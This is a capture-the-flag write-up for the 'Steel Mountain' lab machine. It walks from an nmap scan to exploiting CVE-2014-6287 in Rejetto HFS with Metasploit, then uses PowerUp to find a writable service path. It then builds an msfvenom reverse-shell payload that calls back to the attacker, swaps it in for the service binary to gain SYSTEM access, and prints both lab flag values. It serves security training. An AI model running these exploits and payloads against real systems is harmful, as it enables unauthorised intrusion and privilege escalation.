# Steel Mountain


1. Enumerate with nmap. HTTP server on port 80 and 8080
```
root@ip-10-10-23-3:~# sudo nmap -sS -A 10.10.170.142

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-09 22:27 BST
Nmap scan report for ip-10-10-170-142.eu-west-1.compute.internal (10.10.170.142)
Host is up (0.00050s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl          Microsoft SChannel TLS
| fingerprint-strings:
|   TLSSessionReq:
|     q/"q
|     steelmountain0
|     220508212446Z
|     221107212446Z0
|     steelmountain0
|     )`=q
|     jY$]
|     \xc5
|     "[P}
|     $0"0
|     b)xk
|     XU&6Th
|_    "!u-
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-05-08T21:24:46
|_Not valid after:  2022-11-07T21:24:46
|_ssl-date: 2022-05-09T21:29:22+00:00; 0s from scanner time.
8080/tcp  open  http         HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.60%I=7%D=5/9%Time=62798775%P=x86_64-pc-linux-gnu%r(TLS
SF:SessionReq,346,"\x16\x03\x03\x03A\x02\0\0M\x03\x03by\x87q/\"q\xab\xb89\
SF:xd6\xc1l\xfc\x07\x8d\xbc\x96\)\xa72\*\xa3\x80~\x12\xa92\xdd\x85\x12_\x2
SF:0\+H\0\0<\x17\xd3s\x0b\xeb\xcb\xe9{\x1a\xb5\$`\xb0\xc9K\xd2\x97\xfcH\x0
SF:f\xec\xb3\xa07\xf8\x03\xe6\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\0\x
SF:02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x10`
SF:V\xa4\xf1\x20B0\xbaF\x947~\xf0\xa4\.H0\r\x06\t\*\x86H\x86\xf7\r\x01\x01
SF:\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmountain0\x1e\x1
SF:7\r220508212446Z\x17\r221107212446Z0\x181\x160\x14\x06\x03U\x04\x03\x13
SF:\rsteelmountain0\x82\x01\"0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x01\x05\0\
SF:x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xf0\.\"\x8a5\x19\xed%\
SF:xdb\x05-;\x18C\xb2<0m\xab\x86{\xd9@\x99\)`=q\xc22j\xb6D\xd0\x17\]\xdc\x
SF:90\xf9GI\xb5\x820=\?\xc6\x86!7\xd2\x89p\x157\x03\x95\xa7\xea\)\xef\xbcS
SF:d\x95,\x86\xe9\xd3\xdch\xb6\xe2B\xcd\xebu\x93\xc2\(2{\x03\x92\xd3\x84\(
SF:\xd1\xff\xfe\xf3\)\xc6\xf1F\x90A\x14\x93\xdf\xfd\x85#\xcf\x8a\xf63\x1aB
SF:\xb8\xeb\xa0\x8cp\x19\x96\x0fB\xe4\x82o\xe56\xf2\^\x9eJ\x99\x10\xac\xcc
SF:\?\xd1\x95\xe0\xd2Q\xf5\x19\xda\xe6\x92a\xb02%\xf62;'\x18q\xdcG\xc9\xed
SF:\x02a\",\x99:7j\x8en\xea\$\xbf\xc2\xd8\xe59\|T\xcbY\x11s\x8d\)xT\xbf\xc
SF:1/\xfe\xc6\xa6&\xf6\xc6\?\x04jY\$\]\x1d\xe1\xe7\x1f\x81\x82z\xa2\x0f<\x
SF:d6\xb5\\\xc5\xed\x96\x06\xe6\xb1\x04\x12\xf8\xa2Kj\x8e\xadP\x92\x1a<\xf
SF:4\^\xb5\x9d\x9e\"\[P}\x8a\xad\xc3\x19\xf9\xb6\xe7\xab\xbeh\n\xacun\x84j
SF:\xe3\x9b\x02\x03\x01\0\x01\xa3\$0\"0\x13\x06\x03U\x1d%\x04\x0c0\n\x06\x
SF:08\+\x06\x01\x05\x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x02\
SF:x0400\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x01\0I\xed
SF:\xe4\+\x107\xae\x8c\x95\xe9#\x13\x82\xfe\xd8\x15\xf8W\(\)\xac\xb9H\xb44
SF:\xe9\xe3s\\\]\x20k\xfe\xf5\xb7\xe1l'\t\xf3S\xd9\xe9\xcf\x98\xde#\xc34E\
SF:xe3n\xf9\xb8\xd1\x96\x16\x9cr\x08\xd0\xbf\xa3\xda\xc71\xa2\x98\x14b\xa7
SF:\xc0Dr\xb5\xfe\xe9\"D\xefl\xc5\xc6R\xbdTzc\xef\xcc\x95R\x7f\xf6\x06\x82
SF:\xccY\?\xf7\xce\xb9\"\xfcb\)xk\x20\xb9\xfbD\xb9\xb5\xb3XU&6Th\x14\xca\x
SF:1eOJ\xec\nG\xa3\x1cA\x88h\xa8\xee\x20\+e\xd8`\x8f\x8b\xe1pc\xe6\x94\x98
SF:\x18\n/\xb3\xf06F{\x8c\x9b\x1c\x17aa\xc8\xda\xe0T7\x92\x06KX\x8b\xe6\x8
SF:3\?%\x0fT\xf8\xf8:1\0\xa2\x04\xdb\xc0\xdc\xd0\xcc\0\x10\x16\xfe\xc4\xed
SF:\x98\x83w\xa9C/5\xc4\xb4\xa3\x03\x97~=\xc5\xeb\"!u-\x8b\xe8\xba\xbf\xe5
SF:\x0f%\xed`\xf0\^\.\xeaD\xb9w\xc7\xc7\x19\xc7\xddE\xa6\x10\(\x93\xcb\xdc
SF:\x06#\xc6\xc7`\xa5f\x0c\xe7\x15\xdb\x0e\0\0\0");
MAC Address: 02:5B:65:34:46:1D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/9%OT=80%CT=1%CU=30129%PV=Y%DS=1%DC=D%G=Y%M=025B65%TM
OS:=627987B8%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10E%TI=I%CI=I%TS=7)S
OS:EQ(SP=FD%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=FD%GCD=1%ISR=10E%
OS:TI=I%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301N
OS:W8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%
OS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A
OS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:5b:65:34:46:1d (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-05-09 22:29:23
|_  start_date: 2022-05-09 22:24:36

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms ip-10-10-170-142.eu-west-1.compute.internal (10.10.170.142)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.56 seconds
```

2. Visit the website on port 80, view the source code, and we find that the name of the image is `BillHarper.png`

3. Visit the website on port 8080, click on the link [HttpFileServer 2.3](http://www.rejetto.com/hfs/). We find that it's running `rejetto http file server`

4. Search for an exploit and find the [CVE Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287) with CVE `2014-6287`

5. Launch metasploit with `msfconsole`, search for the exploit with `search rejetto`, and select the module with `use exploit/windows/http/rejetto_hfs_exec`. Set the IP address with `set RHOSTS <ip address>`, set the port with `set RPORT 8080`, and then run with `exploit`

6. Do some enumeration, and find `user.txt` in `C:/Users/bill/Desktop`. `cat user.txt` to get `b04763b6fcf51fcd7c13abc7db4fd365`

7. Download [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1), upload it onto the victim machine with metasploit's `upload` command, start powershell with `load powershell` and `powershell_shell`, and run it with `.\PowerUp.ps1` and then `Invoke-AllChecks`. `AdvancedSystemCareService9` is the service that shows up as an `unquoted service path` vulnerability
```
meterpreter > powershell_shell
PS > .\PowerUp.ps1
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```
- The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

8. Create a payload with `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.23.3 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe` and upload it to the victim machine with the `upload` command

9. Move the payload into `C:\Program Files (x86)\IObit\`. Enter powershell again and stop the `AdvancedSystemCareService9` service with `stop-service AdvancedSystemCareService9`. Start another instance of metasploit and load the payload handler `use exploit/multi/handler`, set the LHOST to the victim machine's IP and the LPORT to the port that was used in the payload. Then run `start-service AdvancedSystemCareService9` on the victim machine to get the shell

10. Navigate to `C:\Users\Administrator\Desktop` and use `more root.txt` to get `9af5f314f57607c00fd09803a587db80`
